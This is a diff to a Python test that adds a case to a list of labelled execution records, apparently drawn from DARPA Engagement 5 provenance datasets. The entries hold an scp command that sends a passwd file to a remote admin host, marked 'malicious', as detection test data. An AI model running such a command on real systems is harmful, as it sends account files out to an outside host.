@@ -149,6 +149,9 @@ def test_failed_execution_and_report_benign_setup(tmp_path):
          'scp passwd admin@128.55.12.149:.', None, '2019-05-10 14:30:00', 'malicious'),
         ('tc-e5-trace', 'ta1-trace-1-e5.bin', '00000000-0000-0000-0000-000000000002',
          'scp passwd admin@128.55.12.149:.', None, '2019-05-10 14:30:00', 'unknown'),
+        ('tc-e5-fivedirections', 'ta1-fivedirections-3-e5.bin', '00000000-0000-0000-0000-000000000003',
+         r'C:\WINDOWS\System32\OpenSSH\SCP.EXE passwd admin@128.55.12.149', None,
+         '2019-05-10 14:50:00', 'malicious'),
     ]:
         root = tmp_path / filename / dataset
         (root / 'data').mkdir(parents=True)
